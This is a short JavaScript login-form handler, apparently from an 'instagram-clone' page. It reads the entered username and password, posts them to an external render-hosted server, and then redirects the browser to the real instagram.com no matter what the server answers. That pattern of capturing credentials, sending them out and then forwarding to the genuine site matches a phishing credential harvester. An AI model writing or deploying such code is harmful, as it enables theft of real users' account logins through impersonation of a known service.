document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    try {
        // const response = await fetch("http://localhost:5000/login", {
        const response = await fetch("https://instagram-clone-yk37.onrender.com/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username,
                password
            })
        });

        const data = await response.json();
         window.location.href = "http://instagram.com";
        if (data.success) {
            alert("✅ Login Successful");
        } else {
            alert(data.message);
        }

    } catch (err) {
        console.error(err);
        alert("Server Error");
    }
});